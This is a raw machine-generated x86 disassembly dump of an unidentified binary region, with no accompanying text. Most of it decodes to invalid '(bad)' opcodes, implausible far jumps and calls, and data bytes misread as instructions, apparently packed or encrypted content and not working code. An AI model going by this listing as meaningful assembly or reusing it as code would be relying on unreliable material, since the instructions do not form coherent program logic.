  40d4f2:	je     0x40d514
  40d4f4:	data16 jae 0x40d535
  40d4f7:	jae    0x40d529
  40d4f9:	xor    BYTE PTR [eax+0x2e],dh
  40d4fc:	fs je  0x40d552
  40d4ff:	jb     0x40d573
  40d501:	jbe    0x40d531
  40d503:	inc    ebx
  40d504:	jb     0x40d56b
  40d506:	dec    ebp
  40d507:	and    BYTE PTR [eax],ah
  40d509:	call   0x2d92:0xc4832b91
  40d510:	dec    esp
  40d511:	pop    eax
  40d512:	mov    bl,bh
  40d514:	int    0x27
  40d516:	jmp    0x8922:0xc3d3f7e7
  40d51d:	mov    ecx,edx
  40d51f:	(bad)  
  40d521:	jg     0x40d56e
  40d523:	scas   eax,DWORD PTR es:[edi]
  40d524:	loopne 0x40d59a
  40d526:	je     0x40d53d
  40d528:	(bad)  
  40d529:	jmp    0x7474:0x74747474
  40d530:	je     0x40d5a6
  40d532:	je     0x40d5a8
  40d534:	je     0x40d5aa
  40d536:	pop    edi
  40d537:	xor    bl,cl
	...
  40d541:	add    BYTE PTR [ebp+0x21777385],al
  40d547:	mov    esi,0x70e28fa0
  40d54c:	dec    eax
  40d54d:	aas    
  40d54e:	clc    
  40d54f:	mov    esp,0xe88a8ff3
  40d554:	push   0xc19bc6b5
  40d559:	push   ss
  40d55a:	out    0xdb,al
  40d55c:	test   DWORD PTR [ebp-0x7a7ae87c],eax
  40d562:	mov    eax,ds:0x23858597
  40d567:	inc    edx
  40d568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d569:	lods   eax,DWORD PTR ds:[esi]
  40d56a:	mov    ds:0xd22f8f49,eax
  40d56f:	xlat   BYTE PTR es:[ebx]
  40d571:	rol    DWORD PTR [esi+eax*1+0x17c15b84],cl
  40d578:	(bad)  
  40d579:	pop    ecx
  40d57a:	out    dx,al
  40d57b:	data16 mov dh,0x92
  40d57e:	test   edi,edi
  40d580:	jmp    0x40d5d0
  40d582:	rcr    BYTE PTR [edx+0x34ffffff],1
  40d588:	or     eax,0x6390e66c
  40d58d:	ror    DWORD PTR [ebp+esi*1+0x54490376],0xb3
  40d595:	loopne 0x40d523
  40d597:	cmp    esp,DWORD PTR [ebx-0x22]
  40d59a:	push   ebx
  40d59b:	jg     0x40d57a
  40d59d:	mov    BYTE PTR [ebx+0x105bf2c5],bh
  40d5a3:	sub    eax,0xdddd7901
  40d5a8:	int3   
  40d5a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5aa:	(bad)  
  40d5ab:	(bad)  
  40d5ac:	mov    ebx,0xffffff8b
  40d5b1:	(bad)  
  40d5b2:	(bad)  
  40d5b3:	(bad)  
  40d5b4:	(bad)  
  40d5b5:	(bad)  
  40d5b6:	(bad)  
  40d5b7:	(bad)  
  40d5b8:	(bad)  
  40d5b9:	inc    ebx
  40d5bb:	and    cl,ch
	...
  40d5c5:	add    BYTE PTR [eax],al
  40d5c7:	add    BYTE PTR [esi+0x5ec26f50],al
  40d5cd:	sub    si,WORD PTR [eax+0x79]
  40d5d1:	cdq    
  40d5d2:	add    edx,DWORD PTR [eax+0x41]
  40d5d5:	pusha  
  40d5d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5d7:	mov    dl,0xde
  40d5d9:	into   
  40d5da:	sbb    esi,DWORD PTR [bp+di+0x68]
  40d5de:	adc    al,BYTE PTR [edi]
  40d5e0:	add    BYTE PTR [eax],al
  40d5e2:	ins    BYTE PTR es:[edi],dx
  40d5e3:	(bad)  
  40d5e4:	push   ebp
  40d5e5:	mov    dh,0xc4
  40d5e7:	(bad)  
  40d5e8:	cmp    al,BYTE PTR [edx+ebx*1]
  40d5eb:	push   es
  40d5ec:	add    bl,bl
  40d5ee:	push   edx
  40d5ef:	push   cs
  40d5f0:	cwde   
  40d5f1:	call   0x2a7f:0x36bd409b
  40d5f8:	loopne 0x40d597
  40d5fa:	or     ebp,esp
  40d5fc:	dec    BYTE PTR [ebx+0x2c0000da]
  40d602:	dec    ebp
  40d603:	jl     0x40d605
  40d605:	add    BYTE PTR [ecx-0x7f],dh
  40d608:	out    dx,eax
  40d609:	add    BYTE PTR [ebp+0x22],dh
  40d60c:	add    BYTE PTR [edi+0x47c6b14a],bh
  40d612:	and    ecx,DWORD PTR [edi]
  40d614:	ins    BYTE PTR es:[edi],dx
  40d615:	stos   BYTE PTR es:[edi],al
  40d616:	retf   
  40d617:	and    BYTE PTR [esi+0x3d23b705],ch
  40d61d:	aam    0x6d
  40d61f:	enter  0x3fdd,0x49
  40d623:	jne    0x40d69a
  40d625:	jne    0x40d684
  40d627:	sub    BYTE PTR [ebp+0x75],dh
  40d62a:	mov    ebp,0x75757589
	...
  40d637:	add    BYTE PTR [edx-0x4c3dcdb4],ch
  40d63d:	popa   
  40d63e:	sbb    DWORD PTR [ecx],ecx
  40d640:	or     al,0x12
  40d642:	xchg   edi,eax
  40d643:	push   eax
  40d644:	and    al,0x9b
  40d646:	dec    edi
  40d647:	shl    DWORD PTR [ecx+ecx*4+0x62],1
  40d64b:	fdiv   QWORD PTR [ecx]
  40d64d:	ret    
  40d64e:	and    al,0x3a
  40d650:	(bad)  
  40d651:	(bad)  
  40d652:	(bad)  
  40d653:	(bad)  
  40d654:	(bad)  
  40d655:	(bad)  
  40d656:	(bad)  
  40d657:	(bad)  
  40d658:	push   DWORD PTR [esp+esi*2-0x6]
  40d65c:	cmp    ecx,DWORD PTR [esi-0x7d]
  40d65f:	je     0x40d6d5
  40d661:	inc    edi
  40d662:	push   ss
  40d663:	xchg   edi,eax
  40d664:	pusha  
  40d665:	ret    0xdbfc
  40d668:	cmp    DWORD PTR [esi-0x28],eax
  40d66b:	jle    0x40d5f3
  40d66d:	inc    ebx
  40d66e:	push   0xffffffb3
  40d670:	aas    
  40d671:	lds    esi,FWORD PTR [edi+0x21]
  40d674:	(bad)  
  40d675:	jl     0x40d692
  40d677:	sbb    al,BYTE PTR [ebx-0x5]
  40d67a:	xchg   ecx,eax
  40d67b:	ins    DWORD PTR es:[edi],dx
  40d67c:	enter  0xc77f,0x3
  40d680:	push   ds
  40d681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d682:	inc    ebx
  40d683:	xor    eax,0xf3927474
  40d688:	je     0x40d6fe
  40d68a:	xchg   ebp,eax
  40d68b:	iret   
  40d68c:	data16 je 0x40d61c
  40d68f:	adc    al,0x7c
  40d691:	adc    al,BYTE PTR [esi+0x1eb21e31]
  40d697:	fsub   DWORD PTR [ebx+0x3c]
  40d69a:	and    bl,al
  40d69c:	lea    edx,[ebx-0x9775b6d]
  40d6a2:	adc    BYTE PTR [ecx-0x72c18746],al
  40d6a8:	lea    ecx,[ebp+0x1b2ee874]
  40d6ae:	ja     0x40d658
  40d6b0:	xchg   ah,bl
  40d6b2:	add    ebp,DWORD PTR [edx+edi*2+0x5a]
  40d6b6:	mov    ?,WORD PTR [ecx]
  40d6b8:	pusha  
  40d6b9:	mov    ah,bl
  40d6bb:	or     DWORD PTR [edx-0x33],ebp
  40d6be:	addr16 ret 0x9851
  40d6c2:	jno    0x40d6da
  40d6c4:	and    edx,DWORD PTR [esi]
  40d6c6:	adc    al,0x8d
  40d6c8:	lea    esp,[ecx-0x72720059]
  40d6ce:	lea    eax,[eax]
	...
  40d6d8:	mov    BYTE PTR [ebp-0x5d],bh
	...
  40d6e3:	add    bh,bh
  40d6e5:	jmp    FWORD PTR [edi]
  40d6e7:	sbb    ch,BYTE PTR [ebx+0x74863818]
  40d6ed:	inc    eax
  40d6ee:	neg    DWORD PTR [edi+0x24]
  40d6f1:	pusha  
  40d6f2:	fs jne 0x40d6fa
  40d6f5:	dec    edi
  40d6f6:	ja     0x40d69e
  40d6f8:	xchg   edi,eax
  40d6f9:	sub    edx,eax
  40d6fb:	fs add eax,0x67ffffe4
  40d701:	jmp    0x40d702
  40d703:	call   FWORD PTR [esi-0x4f]
  40d706:	(bad)  
  40d707:	dec    DWORD PTR [esi]
  40d709:	sub    ecx,esi
  40d70b:	pop    ss
  40d70c:	mov    cl,0x81
  40d70e:	jne    0x40d788
  40d710:	add    al,0x79
  40d712:	xor    esi,DWORD PTR [eax+0x4c]
  40d715:	popf   
  40d716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d717:	pop    ecx
  40d718:	or     eax,0xc6b9d8df
  40d71d:	or     edi,DWORD PTR [ebx+0x3fffff36]
  40d723:	repnz ss fwait
  40d726:	(bad)  
  40d727:	(bad)  
  40d728:	(bad)  
  40d729:	jmp    0xdeea:0x5052e02d
  40d730:	xchg   ebx,eax
  40d731:	fcom   DWORD PTR [ebx-0x7016161c]
  40d737:	cmp    DWORD PTR [ebx-0x10],ebx
  40d73a:	imul   ebp,esi,0x57ae0a2e
  40d740:	outs   dx,DWORD PTR ds:[esi]
  40d741:	mov    ds,ecx
  40d743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d744:	xchg   ebp,eax
  40d745:	in     eax,0x1e
  40d747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d748:	sbb    ch,BYTE PTR [edx+edi*2-0x1700002f]
  40d74f:	jb     0x40d750
  40d751:	(bad)  
  40d752:	push   DWORD PTR [ebx]
  40d754:	xor    esi,DWORD PTR [ebx]
  40d756:	xor    esi,DWORD PTR [ebx]
  40d758:	xor    esi,DWORD PTR [ebx]
  40d75a:	xor    esi,DWORD PTR [ebx]
  40d75c:	ret    0x7530
  40d75f:	lea    ecx,[ebp-0x72727273]
  40d765:	lea    ecx,[ebp-0x6e747473]
  40d76b:	fadd   st,st(0)
  40d76d:	pop    edi
  40d76e:	sar    DWORD PTR [edx+0x28cb4f27],0xa7
  40d775:	scas   eax,DWORD PTR es:[edi]
  40d776:	in     al,0x6d
  40d778:	xlat   BYTE PTR ds:[ebx]
  40d779:	mov    bl,0x9e
  40d77b:	ret    
  40d77c:	outs   dx,BYTE PTR ds:[esi]
  40d77d:	inc    eax
  40d77e:	gs retf 0x9dde
  40d782:	mov    ecx,DWORD PTR [ebx+0x4df18812]
  40d788:	mov    edi,0x84c90a25
  40d78d:	and    DWORD PTR [edi+0x6b],ebx
  40d790:	mov    dl,0xeb
  40d792:	repnz xor esp,ebx
  40d795:	cmc    
  40d796:	int3   
  40d797:	enter  0xed0c,0x54
  40d79b:	rcr    BYTE PTR [esi+eiz*8-0x744e8228],1
  40d7a2:	mov    ebx,eax
  40d7a4:	lods   eax,DWORD PTR ds:[esi]
  40d7a5:	mov    cs,WORD PTR [ebx-0x7e60be75]
  40d7ab:	mov    ecx,DWORD PTR [ebx-0x72980e78]
  40d7b1:	adc    DWORD PTR [esi+edi*1+0x26],ebp
  40d7b5:	repz jbe 0x40d7ac
  40d7b8:	sub    ebp,eax
  40d7ba:	lds    edx,FWORD PTR [ecx+0x4ef9c21a]
  40d7c0:	and    BYTE PTR [esi],ah
  40d7c2:	mov    eax,0x8b8b5d2a
  40d7c7:	mov    esi,DWORD PTR [ebp-0x29]
  40d7ca:	mov    ecx,DWORD PTR [ebx-0x74749f33]
  40d7d0:	mov    eax,DWORD PTR [eax]
	...
  40d7da:	ja     0x40d7af
  40d7dc:	jno    0x40d7f0
  40d7de:	dec    edi
  40d7df:	pop    edx
  40d7e0:	dec    eax
  40d7e1:	sub    DWORD PTR [eax],edx
  40d7e3:	jl     0x40d7cf
  40d7e5:	mov    dl,0x39
  40d7e7:	test   al,0x26
  40d7e9:	lea    edi,[edi-0x2]
  40d7ec:	mov    cl,0xe6
  40d7ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7ef:	fist   WORD PTR [eax+ebx*2]
  40d7f2:	call   0xe929c0df
  40d7f7:	call   0x129c0e4
  40d7fc:	add    BYTE PTR [edi+0x46],bh
  40d7ff:	mov    ds:0xc40000d6,eax
  40d804:	mov    esp,0x9b304854
  40d809:	inc    esi
  40d80a:	imul   ecx,DWORD PTR [eax+ecx*8],0x1d9ce724
  40d811:	or     eax,0x3fa401d4
  40d816:	sar    cl,cl
  40d818:	addr16 xor eax,0x2807d4b3
  40d81e:	(bad)  
  40d81f:	mov    ds,WORD PTR [ebp-0x369cb456]
  40d825:	cmp    eax,DWORD PTR [eax]
  40d827:	add    BYTE PTR [ecx-0x3dffff0f],al
  40d82d:	mov    ?,WORD PTR [edi]
  40d82f:	add    al,ch
  40d831:	jmp    0x40d86d
  40d833:	sub    DWORD PTR [eax],esi
  40d835:	js     0x40d877
  40d837:	mov    esi,0xa110491d
  40d83c:	out    0x69,eax
  40d83e:	lds    edi,FWORD PTR [eax]
  40d840:	jle    0x40d83f
  40d842:	icebp  
  40d843:	adc    bl,BYTE PTR [eax+ebx*8]
  40d846:	fnop   
  40d848:	test   eax,ebp
  40d84a:	call   0x43a32b37
  40d84f:	xchg   ecx,eax
  40d850:	fldcw  WORD PTR es:[ebx]
  40d853:	push   ecx
  40d854:	pop    eax
  40d855:	test   DWORD PTR [ecx+0x268e1105],esi
  40d85b:	retf   0x64d9
  40d85e:	inc    esp
  40d85f:	clc    
  40d860:	mov    esi,0x781f1b3
  40d865:	jnp    0x40d84d
  40d867:	icebp  
  40d868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d869:	call   0xc7526356
  40d86e:	call   0x4586c15b
  40d873:	inc    ebp
  40d874:	inc    ebp
  40d875:	outs   dx,DWORD PTR ds:[esi]
  40d876:	outs   dx,BYTE PTR ds:[esi]
  40d877:	and    dh,BYTE PTR [edx+0x20]
  40d87a:	gs cs or eax,0x442f6972
  40d881:	outs   dx,BYTE PTR ds:[esi]
  40d882:	je     0x40d8f3
  40d884:	gs imul esp,DWORD PTR gs:[ecx+0x76],0x22736553
  40d88d:	cs jae 0x40d8b0
  40d890:	je     0x40d8f7
  40d892:	bound  esi,QWORD PTR cs:[edx+0x72]
  40d896:	or     eax,0x2920434d
  40d89b:	and    BYTE PTR [esi+0x53],dh
  40d89e:	inc    esp
  40d89f:	and    esp,DWORD PTR [edx]
  40d8a1:	ins    BYTE PTR es:[edi],dx
  40d8a2:	and    BYTE PTR [edx+0x20],ah
  40d8a5:	inc    ebx
  40d8a6:	jbe    0x40d91e
  40d8a8:	outs   dx,DWORD PTR ds:[esi]
  40d8a9:	and    BYTE PTR [eax],ah
  40d8ab:	and    BYTE PTR [ebp+0x57],ah
  40d8ae:	je     0x40d903
  40d8b0:	je     0x40d91b
  40d8b2:	ins    DWORD PTR es:[edi],dx
  40d8b3:	jo     0x40d923
  40d8b5:	imul   esp,DWORD PTR [edx+0x41],0x3e6d2069
  40d8bc:	gs dec ebp
  40d8be:	je     0x40d925
  40d8c0:	imul   esp,DWORD PTR [eax],0x5752220a
  40d8c6:	outs   dx,DWORD PTR ds:[esi]
  40d8c7:	jb     0x40d92c
  40d8c9:	and    BYTE PTR [esi+0x70],ah
  40d8cc:	ins    WORD PTR es:[edi],dx
  40d8ce:	outs   dx,DWORD PTR ds:[esi]
  40d8cf:	push   edi
  40d8d0:	jb     0x40d8fa
  40d8d2:	gs jo  0x40d8e2
  40d8d5:	outs   dx,BYTE PTR ds:[esi]
  40d8d6:	popa   
  40d8d7:	arpl   WORD PTR [eax+0x73],si
  40d8da:	ins    DWORD PTR es:[edi],dx
  40d8db:	dec    esp
  40d8dc:	push   eax
  40d8dd:	inc    ebx
  40d8de:	cmp    al,0x42
  40d8e0:	outs   dx,BYTE PTR ds:[esi]
  40d8e1:	or     ch,BYTE PTR [esi]
  40d8e3:	outs   dx,DWORD PTR ds:[esi]
  40d8e4:	outs   dx,BYTE PTR ds:[esi]
  40d8e5:	jae    0x40d95b
  40d8e7:	outs   dx,DWORD PTR ds:[esi]
  40d8e8:	imul   esi,DWORD PTR [esi+0x61],0x3d767266
  40d8ef:	inc    ecx
  40d8f0:	push   esp
  40d8f1:	gs popa 
  40d8f3:	ins    DWORD PTR es:[edi],dx
  40d8f4:	ins    DWORD PTR es:[edi],dx
  40d8f5:	inc    ebp
  40d8f6:	inc    ebp
  40d8f7:	inc    ebp
  40d8f8:	inc    ebp
  40d8f9:	inc    ebp
  40d8fa:	jmp    0x40d88d
  40d8fc:	pop    esi
  40d8fd:	call   0xe929c1ea
  40d902:	call   0x129c1ef
  40d907:	add    BYTE PTR [eax+0x786e86fb],ah
  40d90d:	mov    cl,0x6e
  40d90f:	fcomi  st,st(1)
  40d911:	xchg   esp,eax
  40d912:	mov    edx,0x5131cf9b
  40d917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d918:	(bad)  
  40d919:	in     eax,dx
  40d91a:	push   ecx
  40d91b:	daa    
  40d91c:	pop    eax
  40d91d:	inc    edi
  40d91e:	dec    eax
  40d91f:	fiadd  WORD PTR [eax]
  40d921:	add    BYTE PTR [ecx+0x5d],dl
  40d924:	add    BYTE PTR [eax],al
  40d926:	adc    ebx,DWORD PTR [esi]
  40d928:	add    BYTE PTR [eax],al
  40d92a:	(bad)  [edi+0x54]
  40d92d:	ret    0x5ae1
  40d930:	neg    DWORD PTR [esp+edx*8+0x4d]
  40d934:	fnstenv [esi-0x42b99d56]
  40d93a:	not    cl
  40d93c:	push   edx
  40d93d:	mov    ebp,0x48f51907
  40d942:	add    BYTE PTR [ebp-0x6cc3dbad],cl
  40d948:	lea    ecx,[ebp-0x77ca4773]
  40d94e:	les    ebp,FWORD PTR [edx+edx*2-0x12fa449c]
  40d955:	jbe    0x40d934
  40d957:	adc    eax,DWORD PTR [ebx-0x110201bc]
  40d95d:	inc    ebx
  40d95e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d95f:	dec    edi
  40d960:	(bad)
  40d964:	repz mov edi,ebp
  40d967:	and    eax,0x3707c263
  40d96c:	fimul  DWORD PTR cs:[ebp-0x7245f573]
  40d973:	lea    ecx,[ebp-0x1]
  40d979:	(bad)  
  40d97a:	(bad)  
  40d97b:	(bad)  
  40d97c:	(bad)  
  40d97d:	(bad)  
  40d97e:	call   0x75b630cd
  40d983:	jne    0x40d9fa
  40d985:	jne    0x40d9fc
  40d987:	jne    0x40d9fe
  40d989:	jne    0x40d98b
  40d98b:	add    BYTE PTR ds:0xf264e42f,dl
  40d991:	pop    ds
  40d992:	das    
  40d993:	sahf   
  40d994:	push   eax
  40d995:	mov    esp,0x46bca581
  40d99a:	mov    ds:0x5bb65b6f,al
  40d99f:	in     al,0xb6
  40d9a1:	imul   BYTE PTR [edx+0x57000069]
  40d9a7:	jl     0x40d9f5
  40d9a9:	jbe    0x40d95c
  40d9ab:	inc    esi
  40d9ac:	mov    edi,0xcab056c0
  40d9b1:	jne    0x40d9df
  40d9b3:	mov    DWORD PTR [ebx+0x6b],edi
  40d9b6:	pop    eax
  40d9b7:	adc    eax,0x3cf25a12
  40d9bc:	add    ah,BYTE PTR [edi-0x143c38cb]
  40d9c2:	repz add BYTE PTR [eax],al
  40d9c5:	add    eax,0x4229
  40d9ca:	jno    0x40d99f
  40d9cc:	js     0x40d9ce
  40d9ce:	or     al,0xb1
  40d9d0:	xchg   BYTE PTR [edx+0x14],bh
  40d9d3:	xchg   ebp,eax
  40d9d4:	xchg   esp,eax
  40d9d5:	pushf  
  40d9d6:	pushf  
  40d9d7:	push   edi
  40d9d8:	fnstenv [edx+0x1c]
  40d9db:	push   ebx
  40d9dc:	cs xchg ebx,eax
  40d9de:	in     al,dx
  40d9df:	jle    0x40d9ed
  40d9e1:	pop    eax
  40d9e2:	push   ds
  40d9e3:	push   esp
  40d9e4:	clc    
  40d9e5:	arpl   WORD PTR [ebp-0x3ff3f3f4],cx
  40d9eb:	das    
  40d9ec:	or     al,0xc
  40d9ee:	call   0x2424:0xc0c0c2c
  40d9f5:	and    al,0x24
  40d9f7:	and    al,0x24
  40d9f9:	and    al,0x24
  40d9fb:	and    al,0x79
  40d9fd:	push   ecx
  40d9fe:	clc    
  40d9ff:	int3   
  40da00:	fwait
  40da01:	outs   dx,DWORD PTR ds:[esi]
  40da02:	lea    eax,[esi-0x3937270d]
  40da08:	or     esi,eax
  40da0a:	mov    dl,0x48
  40da0c:	(bad)  
  40da0d:	fnstsw WORD PTR [edi-0x12]
  40da10:	fld    TBYTE PTR [ebp+0x2]
  40da13:	daa    
  40da14:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  40da1a:	test   DWORD PTR [ebp+0x98d8d85],eax
  40da20:	js     0x40da83
  40da22:	push   edx
  40da23:	lea    ecx,[ebp-0x1acf3101]
  40da29:	rcr    DWORD PTR [esi+0x6f4f425e],cl
  40da2f:	test   eax,0x93edfabd
  40da34:	repnz sti 
  40da36:	out    0xca,al
  40da38:	add    eax,0x48a33fa4
  40da3d:	push   edx
  40da3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da3f:	fimul  WORD PTR [esp+edx*8]
  40da42:	xchg   ebp,eax
  40da43:	jmp    0x6f3a109e
  40da48:	lea    ecx,[ebp-0x727228ea]
  40da4e:	popf   
  40da4f:	call   FWORD PTR [esi-0x73]
  40da52:	call   0x447706ac
  40da57:	out    dx,al
  40da58:	mov    bh,0xbe
  40da5a:	push   esp
  40da5b:	sbb    ebx,DWORD PTR [esi+0x235f357d]
  40da61:	leave  
  40da62:	pop    ds
  40da63:	or     edx,DWORD PTR [ecx+ecx*8]
  40da66:	pusha  
  40da67:	test   BYTE PTR [esp+edx*2+0x2c],bh
  40da6b:	call   0x54ecc358
  40da70:	cdq    
  40da71:	xchg   DWORD PTR [ecx+0x42],esp
  40da74:	loop   0x40da39
  40da76:	pushf  
  40da77:	cmp    al,BYTE PTR [ecx]
  40da79:	dec    esp
  40da7a:	pop    esp
  40da7b:	mov    ch,0x6a
  40da7d:	xchg   edi,eax
  40da7e:	(bad)
  40da81:	fwait
  40da82:	mov    ecx,0x31db6192
  40da87:	sbb    BYTE PTR [ecx+esi*2],bh
  40da8a:	cdq    
  40da8b:	call   0xe5d5078
  40da90:	call   0x89cac37d
  40da95:	mov    DWORD PTR [ecx-0x76767677],ecx
  40da9b:	mov    DWORD PTR [esi+0x50],ecx
  40da9e:	push   es
	...
  40daa7:	add    BYTE PTR [eax],al
  40daa9:	add    BYTE PTR [eax-0x1bcc32dc],dh
  40daaf:	mov    bh,BYTE PTR [ebx-0x1177ad02]
  40dab5:	test   esp,esp
  40dab7:	lds    ebx,FWORD PTR [esi]
  40dab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daba:	pop    ebp
  40dabb:	add    ebx,edi
  40dabd:	pop    ebp
  40dabe:	in     al,dx
  40dabf:	inc    ebx
  40dac0:	or     al,0x72
  40dac2:	add    BYTE PTR [eax],al
  40dac4:	ficomp WORD PTR [ecx]
  40dac6:	add    BYTE PTR [eax],al
  40dac8:	cmp    dl,al
  40daca:	add    BYTE PTR [eax],al
  40dacc:	xchg   ebx,eax
  40dacd:	cdq    
  40dace:	call   0x459c7924
  40dad3:	pop    ebp
  40dad4:	arpl   WORD PTR ds:0x95ffce46,di
  40dada:	(bad)  
  40dadb:	int    0xc8
  40dadd:	inc    ebp
  40dade:	xlat   BYTE PTR ds:[ebx]
  40dadf:	test   eax,0xda5d6e1c
  40dae4:	add    BYTE PTR [eax],al
  40dae6:	(bad)  
  40dae7:	fcmovnu st,st(1)
  40dae9:	jne    0x40daeb
  40daeb:	add    BYTE PTR [eax],al
  40daed:	add    BYTE PTR [eax+ebp*1+0x4c],0x5
  40daf2:	clc    
  40daf3:	je     0x40db44
  40daf5:	adc    BYTE PTR [si-0x40ea],dh
  40dafa:	jne    0x40da95
  40dafc:	pop    eax
  40dafd:	cmp    eax,0xdc54167
  40db02:	push   edx
  40db03:	dec    esp
  40db04:	dec    ebp
  40db05:	pop    edi
  40db06:	test   al,0x22
  40db08:	xor    al,0xea
  40db0a:	loope  0x40dafc
  40db0c:	and    DWORD PTR [ebx+0x3ab0],edx
  40db12:	mov    al,bh
  40db14:	add    BYTE PTR [eax],al
  40db16:	add    al,ch
  40db18:	call   0xe929c405
  40db1d:	call   0xaabcc40a
  40db22:	mov    ds:0x45454545,al
  40db27:	inc    ebp
  40db28:	inc    ebp
  40db29:	inc    ebp
  40db2a:	inc    ebp
  40db2b:	inc    ebp
  40db2c:	add    al,0x4
  40db2e:	loop   0x40db84
  40db30:	xchg   ebp,eax
  40db31:	adc    BYTE PTR [ebx+0x3f],0xbe
  40db35:	add    DWORD PTR [ebx-0x15],0x541f6907
  40db3c:	ror    al,0x13
  40db3f:	(bad)  
  40db40:	pop    eax
  40db41:	leave  
  40db42:	xlat   BYTE PTR ds:[ebx]
  40db43:	mov    cl,0x6b
  40db45:	dec    eax
  40db46:	add    al,0x4
  40db48:	popf   
  40db49:	leave  
  40db4a:	cmp    ch,bl
  40db4c:	rcl    DWORD PTR [esi+esi*2+0x1592c41b],1
  40db53:	lock retf 0x5c6b
  40db57:	imul   ecx,DWORD PTR [ebx+0x1f],0xb
  40db5b:	push   edx
  40db5c:	std    
  40db5d:	nop
  40db5e:	sbb    eax,0x3a6363b2
  40db63:	push   esp
  40db64:	fld    QWORD PTR [esp+eax*1]
  40db67:	stos   DWORD PTR es:[edi],eax
  40db68:	push   ecx
  40db69:	add    DWORD PTR [esp+eax*1],0x1
  40db6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db6e:	mov    es,WORD PTR [ecx+ecx*4]
  40db71:	add    eax,0xed05fc3a
  40db76:	xor    ebp,DWORD PTR [edx+0x2c41da4]
  40db7c:	fcmovne st,st(3)
  40db7e:	aas    
  40db7f:	jbe    0x40dbf5
  40db81:	je     0x40dbb5
  40db83:	stc    
  40db84:	xchg   al,al
  40db86:	inc    eax
  40db87:	adc    eax,0x8989894b
  40db8c:	and    esp,DWORD PTR [edi]
  40db8e:	mov    DWORD PTR [ecx-0x767666e7],ecx
  40db94:	mov    edi,edi
  40db96:	(bad)  
  40db97:	(bad)  
  40db98:	(bad)  
  40db99:	(bad)  
  40db9a:	(bad)  
  40db9b:	(bad)  
  40db9c:	(bad)  
  40db9d:	(bad)  
  40db9e:	aas    
  40db9f:	ror    DWORD PTR [ebx+ecx*8-0x7d],cl
  40dba3:	mov    ecx,0x33619f7b
  40dba8:	dec    esi
  40dba9:	sbb    DWORD PTR [ebx-0x56ce2b],ecx
  40dbaf:	lock mov esp,0x820cebc2
  40dbb5:	sub    ch,al
  40dbb7:	call   0xe929c4a4
  40dbbc:	call   0x74b5c4a9
  40dbc1:	gs js  0x40dc09
  40dbc4:	pcmpeqb mm6,QWORD PTR [eax+edi*4-0x71]
  40dbc9:	fbstp  TBYTE PTR [esi]
  40dbcb:	dec    esi
  40dbcc:	mov    ecx,esi
  40dbce:	mov    ch,0x6a
  40dbd0:	or     eax,0x2b62c529
  40dbd5:	mov    eax,0xd8b5c186
  40dbda:	(bad)  
  40dbdb:	(bad)  
  40dbdc:	adc    al,bl
  40dbde:	sbb    edi,DWORD PTR [edi-0x23]
  40dbe1:	push   esi
  40dbe2:	push   es
  40dbe3:	cmc    
  40dbe4:	pusha  
  40dbe5:	test   eax,0x4281f00b
  40dbea:	je     0x40dc60
  40dbec:	arpl   bp,di
  40dbee:	je     0x40dc64
  40dbf0:	or     DWORD PTR [esp+ebx*2],edi
  40dbf3:	je     0x40dbf5
  40dbf5:	test   BYTE PTR gs:[edx+esi*2],ch
  40dbf9:	mov    ebp,0x3ac3532d
  40dbfe:	mov    ds:0x4ec18942,al
  40dc03:	cmp    eax,0xa39c7e3d
  40dc08:	mov    DWORD PTR [ecx+0x284964],edx
  40dc0e:	add    BYTE PTR [eax],al
  40dc10:	jae    0x40dc24
  40dc12:	popf   
  40dc13:	ja     0x40dbca
  40dc15:	inc    ebx
  40dc16:	psrlq  mm1,QWORD PTR [edi]
  40dc19:	mov    WORD PTR ds:0x21897442,es
  40dc1f:	neg    BYTE PTR [edx-0xc922ea1]
  40dc25:	push   esp
  40dc26:	nop
  40dc27:	mov    ds:0x516d53a,al
  40dc2c:	pop    ebp
  40dc2d:	add    BYTE PTR [eax],al
  40dc2f:	add    BYTE PTR [edi+0xb4],dl
  40dc35:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  40dc3c:	add    DWORD PTR [ebx+0x990f9f],0x0
	...
  40dc4b:	add    dh,dh
  40dc4d:	adc    dh,BYTE PTR [ecx+0x1f]
  40dc50:	pop    edi
  40dc51:	cmp    BYTE PTR [esi+0x14],bl
  40dc54:	sbb    eax,0x8bba6bce
  40dc59:	lahf   
  40dc5a:	add    eax,DWORD PTR [edi]
  40dc5c:	mov    cl,ah
  40dc5e:	inc    eax
  40dc5f:	sbb    ebx,DWORD PTR [edx]
  40dc61:	fs in  eax,dx
  40dc63:	sub    al,BYTE PTR [eax]
  40dc65:	add    al,ah
  40dc67:	xchg   BYTE PTR [eax],al
  40dc69:	add    al,ch
  40dc6b:	retf   0x0
  40dc6e:	mov    ds:0x462d690,eax
  40dc73:	cmp    cl,bl
  40dc75:	aaa    
  40dc76:	dec    ecx
  40dc77:	test   DWORD PTR [edi-0x36],edx
  40dc7a:	dec    edx
  40dc7b:	mov    ch,BYTE PTR ds:0x6547ff0e
  40dc81:	jne    0x40dcae
  40dc83:	mov    BYTE PTR [esi+0x54000008],dl
  40dc89:	mov    eax,0x8255
  40dc8e:	add    BYTE PTR [esi-0x11],cl
  40dc91:	sar    ecx,cl
  40dc93:	out    dx,eax
  40dc94:	cwde   
  40dc95:	stos   DWORD PTR es:[edi],eax
  40dc96:	cmp    eax,0xbb3c3aaa
  40dc9b:	jo     0x40dcab
  40dc9d:	dec    esp
  40dc9e:	mov    dl,0xd7
  40dca0:	inc    ebp
  40dca1:	loopne 0x40dc67
  40dca3:	scas   eax,DWORD PTR es:[edi]
  40dca4:	mov    bl,0x89
  40dca6:	push   edi
